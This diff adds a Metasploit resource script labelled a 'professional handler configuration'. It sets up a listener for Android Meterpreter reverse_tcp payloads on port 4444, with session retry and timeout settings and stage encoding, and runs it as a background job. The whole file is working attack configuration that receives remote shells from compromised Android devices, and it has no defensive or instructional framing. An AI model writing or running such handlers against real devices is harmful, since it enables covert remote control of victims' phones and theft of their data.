@@ -1,0 +1,17 @@
+# Professional Handler Configuration
+# Optimized for Android Meterpreter Payloads
+# Created: 2025-11-22
+
+# Primary Handler: TCP with Advanced Settings
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+set SessionCommunicationTimeout 300
+set SessionExpirationTimeout 600
+set SessionRetryTotal 30
+set SessionRetryWait 10
+set EnableStageEncoding true
+set StageEncoder generic/none
+exploit -j -z
